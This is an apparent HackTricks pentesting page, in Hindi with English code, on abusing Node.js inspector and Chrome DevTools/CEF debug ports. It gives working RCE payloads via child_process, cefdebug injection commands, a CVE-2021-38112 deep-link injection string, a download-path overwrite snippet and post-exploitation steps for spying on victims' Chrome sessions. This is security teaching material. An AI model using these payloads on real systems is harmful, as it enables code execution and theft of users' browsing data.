# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## मूल जानकारी

[डॉक्स से](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` switch के साथ शुरू किए जाने पर, Node.js process एक debugging client के लिए listen करता है। **डिफ़ॉल्ट** रूप से, यह host और port **`127.0.0.1:9229`** पर listen करेगा। प्रत्येक process को एक **unique** **UUID** भी assign किया जाता है।<sup>[[4]](#references)</sup>

Inspector clients को connect करने के लिए host address, port और UUID का पता होना और उन्हें specify करना आवश्यक है। एक full URL कुछ इस प्रकार दिखाई देगा: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`।<sup>[[4]](#references)</sup>

> [!WARNING]
> चूंकि **debugger को Node.js execution environment का full access प्राप्त है**, इसलिए इस port से connect करने में सक्षम malicious actor, Node.js process की ओर से arbitrary code execute कर सकता है (**potential privilege escalation**)।

Inspector शुरू करने के कई तरीके हैं:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
जब आप किसी inspected process को शुरू करते हैं, तो कुछ ऐसा दिखाई देगा:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) पर आधारित Processes को **debugger** खोलने के लिए `--remote-debugging-port=9222` param का उपयोग करना आवश्यक होता है (SSRF protections बहुत समान रहती हैं)। हालांकि, **NodeJS** **debug** session देने के बजाय ये [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) का उपयोग करके browser से communicate करते हैं। यह browser को control करने का एक interface है, लेकिन इसमें direct RCE नहीं होता।<sup>[[5]](#references)</sup>

जब आप debugged browser शुरू करेंगे, तो कुछ ऐसा दिखाई देगा:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets और same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Web-browser में खुली Websites browser security model के अंतर्गत WebSocket और HTTP requests कर सकती हैं। **unique debugger session id प्राप्त करने के लिए एक प्रारंभिक HTTP connection** आवश्यक है। **same-origin-policy** Websites को **यह HTTP connection** बनाने से **रोकती है**। [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** से अतिरिक्त security के लिए, Node.js यह सत्यापित करता है कि connection के **'Host' headers** में या तो **IP address** या **`localhost`** या **`localhost6`** का सटीक रूप से उल्लेख हो।<sup>[[12]](#references)</sup>

> [!TIP]
> यह **security measure inspector का exploit करके** केवल **HTTP request भेजकर** code run करने से **रोकता है** (जो SSRF vuln का exploit करके किया जा सकता था)।

### Running processes में inspector शुरू करना

आप किसी running nodejs process को **signal SIGUSR1** भेजकर उसे default port में **inspector शुरू** करने के लिए कह सकते हैं। हालांकि, ध्यान दें कि आपके पास पर्याप्त privileges होना आवश्यक है, इसलिए इससे आपको **process के अंदर की information तक privileged access** मिल सकता है, लेकिन direct privilege escalation नहीं।
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> यह containers में उपयोगी है क्योंकि `--inspect` के साथ **process को बंद करके नया process शुरू करना** एक **option नहीं है**, क्योंकि **container** process के साथ **kill** हो जाएगा।

### inspector/debugger से connect करें

**Chromium-based browser** से connect करने के लिए Chrome या Edge में क्रमशः `chrome://inspect` या `edge://inspect` URLs access किए जा सकते हैं। Configure button पर click करके यह सुनिश्चित किया जाना चाहिए कि **target host और port** सही रूप से listed हैं। Image में Remote Code Execution (RCE) का एक example दिखाया गया है:

![Debugger access करने के लिए एक URL दिखाई देगा। जैसे ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger से connect करें: Chromium-based browser से connect करने के लिए,...](<../../images/image (674).png>)

**command line** का उपयोग करके आप debugger/inspector से connect कर सकते हैं:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) टूल locally चल रहे **inspectors** को **find** करने और उनमें **code inject** करने की अनुमति देता है।<sup>[[1]](#references)[[2]](#references)[[11]](#references)[[13]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> ध्यान दें कि [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के माध्यम से किसी browser से connected होने पर **NodeJS RCE exploits काम नहीं करेंगे** (आपको API की जाँच करके इससे करने योग्य interesting चीज़ें ढूँढनी होंगी)।

## NodeJS Debugger/Inspector में RCE

> [!TIP]
> यदि आप यहाँ यह जानने के लिए आए हैं कि [**Electron में XSS से RCE कैसे प्राप्त करें, तो यह पेज देखें।**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

जब आप किसी Node **inspector** से **connect** कर सकते हैं, तो **RCE** प्राप्त करने के कुछ सामान्य तरीके इस प्रकार हैं (ऐसा लगता है कि यह **Chrome DevTools protocol से connection में काम नहीं करेगा**):<sup>[[3]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

आप API यहां देख सकते हैं: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)<sup>[[5]](#references)</sup>\
इस section में मैं केवल उन interesting चीज़ों की सूची दूंगा, जिनका उपयोग लोगों ने इस protocol को exploit करने के लिए किया है।

### Parameter Injection via Deep Links

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) में Rhino security ने discovered किया कि CEF पर आधारित एक application ने system में एक custom URI **registered a custom UR**I (workspaces://index.html) किया, जो full URI प्राप्त करता था और फिर उस URI से आंशिक रूप से configuration तैयार करके **launched the CEF based applicatio**n।<sup>[[8]](#references)</sup>

यह discovered हुआ कि URI parameters को URL decoded किया जाता था और CEF आधारित application को launch करने के लिए उपयोग किया जाता था, जिससे user **inject** flag **`--gpu-launcher`** को **command line** में डालकर मनमानी चीज़ें execute कर सकता था।

इसलिए, payload इस तरह का हो सकता है:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Will execute a calc.exe.

### Files को Overwrite करना

उस folder को बदलें जहाँ **downloaded files को save किया जाना है** और एक file download करके application के अक्सर उपयोग किए जाने वाले **source code** को अपने **malicious code** से **overwrite** करें।<sup>[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE और exfiltration

इस post के अनुसार: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) theriver से RCE प्राप्त करना और internal pages को exfiltrate करना संभव है।<sup>[[9]](#references)[[10]](#references)</sup>

### Post-Exploitation

एक वास्तविक environment में और **Chrome/Chromium based browser का उपयोग करने वाले user PC को compromise करने के बाद**, आप **debugging activated और debugging port को port-forward करके** Chrome process launch कर सकते हैं, ताकि आप उस तक access कर सकें। इस तरह आप **victim द्वारा Chrome में किए जाने वाले हर कार्य को inspect कर सकेंगे और sensitive information चुरा सकेंगे**।<sup>[[7]](#references)</sup>

stealth तरीका **हर Chrome process को terminate करना** और फिर कुछ ऐसा call करना है
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## संदर्भ

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inspection और exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger के माध्यम से Visual Studio Code Remote Code Execution](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - शुरुआत करना](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chrome के Debugging Feature का दुरुपयोग करके Browsing Sessions को दूरस्थ रूप से देखना और नियंत्रित करना](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS Rebinding और CDP के माध्यम से WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Bot से RCE तक](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)

{{#include ../../banners/hacktricks-training.md}}
